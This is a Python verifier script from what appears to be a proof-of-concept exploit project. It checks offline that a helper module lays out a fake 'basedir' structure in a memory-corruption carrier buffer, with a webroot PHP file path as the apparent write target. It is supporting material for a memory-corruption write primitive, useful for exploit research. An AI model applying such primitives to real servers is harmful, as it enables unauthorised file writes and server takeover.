#!/usr/bin/env python3 -I
"""Byte-layout verifier for fresh_dtor_placement.py (offline; no lab needed).

Asserts the fresh-dtor-block placement: the fake basedir backing {len, path+NUL} lands at the
fresh block's data[2] (default +0x1030), WITHOUT forging DT->used_slots.

    python3 -I poc/primitives/write/verify_fresh_dtor_placement.py
"""
from __future__ import annotations

import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from primitives.write import fresh_dtor_placement as fdp  # noqa: E402

PATH = b"/var/www/html/x.php\x00"


def check(name, cond):
    print(("  ok   " if cond else "  FAIL ") + name)
    return cond


def main():
    ok = True
    car = bytearray(0x60000)
    fz = fdp.place(car, PATH)
    ok &= check("default fz = fresh_block(+0x1000) + data[2] = 0x1030", fz == 0x1030)
    ok &= check("DT->used_slots NOT forged (carrier[0:8] == 0)", car[0:8] == b"\x00" * 8)
    ok &= check("basedir->len = len(path+NUL) at fz", struct.unpack_from("<Q", car, fz)[0] == len(PATH))
    ok &= check("basedir->val = path+NUL at fz+8", car[fz + 8:fz + 8 + len(PATH)] == PATH)

    car2 = bytearray(0x60000)
    fz2 = fdp.place(car2, PATH, fz=0x2050)
    ok &= check("explicit fz override honoured", fz2 == 0x2050
                and struct.unpack_from("<Q", car2, 0x2050)[0] == len(PATH))

    print("\n==== verify_fresh_dtor_placement: %s ====" % ("PASS" if ok else "FAIL"))
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
